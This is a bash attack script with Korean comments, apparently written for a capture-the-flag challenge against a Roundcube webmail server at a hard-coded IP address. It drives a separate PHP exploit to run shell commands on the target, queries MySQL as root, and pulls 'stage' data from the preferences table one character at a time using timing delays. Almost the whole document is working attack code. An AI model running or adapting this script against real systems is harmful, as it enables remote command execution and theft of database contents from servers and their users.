#!/bin/bash
# MySQL Timing-based Data Extraction
# preferences 테이블에서 Stage 4 데이터를 문자 단위로 추출

TARGET="http://13.125.104.131:30083"

echo "=== MySQL Timing-based Data Extraction ==="
echo

# Step 1: MySQL 연결 정보 확인 (타이밍)
echo "[*] Step 1: MySQL 연결 테스트 (타이밍)"
php loot/fearsoff_exploit.php "$TARGET" "testuser" "testpass" \
  "mysql -h localhost -u root 2>&1 | head -5" > /tmp/mysql_test.log 2>&1 &
PID=$!
sleep 5
kill $PID 2>/dev/null

# Step 2: Roundcube 테이블 확인
echo "[*] Step 2: Roundcube 테이블 확인"
php loot/fearsoff_exploit.php "$TARGET" "testuser" "testpass" \
  "mysql -h localhost -u root roundcube -e 'SHOW TABLES;' 2>/dev/null" > /tmp/tables.log 2>&1 &
PID=$!
sleep 3
kill $PID 2>/dev/null

# Step 3: Timing으로 SELECT 쿼리 테스트
# 특정 조건이 true/false에 따라 sleep 시간을 다르게
echo "[*] Step 3: Stage4 데이터 존재 여부 (타이밍)"

# 이 쿼리는 preferences 테이블의 user_id가 1인 레코드에서 prefs_name이 'stage4'을 포함하면 sleep 5, 아니면 sleep 1
QUERY="SELECT IF(COUNT(*) > 0, SLEEP(5), SLEEP(1)) FROM preferences WHERE prefs_name LIKE '%stage%';"

echo "Query: $QUERY"
BEFORE=$(date +%s%N)
php loot/fearsoff_exploit.php "$TARGET" "testuser" "testpass" \
  "mysql -h localhost -u root roundcube -e \"$QUERY\" 2>/dev/null" > /dev/null 2>&1 &
PID=$!
sleep 10
kill $PID 2>/dev/null
AFTER=$(date +%s%N)
TIME_MS=$(( ($AFTER - $BEFORE) / 1000000 ))

echo "Response time: ${TIME_MS}ms"
if [ $TIME_MS -gt 4000 ]; then
  echo "[+] Stage 데이터 발견! (sleep 5 실행됨)"
else
  echo "[-] Stage 데이터 없음 (sleep 1만 실행됨)"
fi
echo

# Step 4: 데이터 추출 (CHAR 단위)
echo "[*] Step 4: 데이터 첫 글자 추출"

# 첫 글자 확인: SELECT SUBSTR(prefs_value, 1, 1) FROM preferences WHERE prefs_name LIKE '%stage%'
# 만약 첫 글자가 'H'라면 sleep 5, 아니면 sleep 1

for CHAR in 'H' 'S' 'F' 'T' '{' '-' '_'; do
  QUERY="SELECT IF(SUBSTR((SELECT GROUP_CONCAT(prefs_value) FROM preferences WHERE prefs_name LIKE '%stage%'), 1, 1) = '$CHAR', SLEEP(5), SLEEP(1));"
  
  BEFORE=$(date +%s%N)
  php loot/fearsoff_exploit.php "$TARGET" "testuser" "testpass" \
    "mysql -h localhost -u root roundcube -e \"$QUERY\" 2>/dev/null" > /dev/null 2>&1 &
  PID=$!
  sleep 7
  kill $PID 2>/dev/null
  AFTER=$(date +%s%N)
  TIME_MS=$(( ($AFTER - $BEFORE) / 1000000 ))
  
  if [ $TIME_MS -gt 4000 ]; then
    echo "[+] First char is: '$CHAR' (Response time: ${TIME_MS}ms)"
    break
  fi
done

echo
echo "[+] Extraction complete"
